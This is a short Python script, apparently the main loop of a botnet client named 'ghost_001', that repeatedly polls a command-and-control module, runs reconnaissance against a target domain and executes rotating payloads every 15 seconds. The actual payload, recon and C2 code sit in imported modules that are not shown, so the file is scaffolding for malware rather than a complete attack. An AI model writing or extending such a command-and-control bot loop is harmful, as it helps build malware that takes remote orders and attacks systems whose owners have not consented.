from core import bot_logger, c2_commander, recon_module
import core.payload_rotator as payload_rotator
# Run_bot.py
import time

bot_id = "ghost_001"
print("[*] Starting bot...")

bot_logger.log_bot(bot_id)

while True:
    c2_commander.check_and_run(bot_id)
    recon_module.run_recon(bot_id, "example.com")
    payload_rotator.run_payload(bot_id)
    time.sleep(15)
    print("[*] Bot cycle complete, sleeping for 15 seconds...")
    print("[*] Bot is running, waiting for commands...")
# This is the main bot loop that continuously checks for commands, runs recon, and executes payloads.

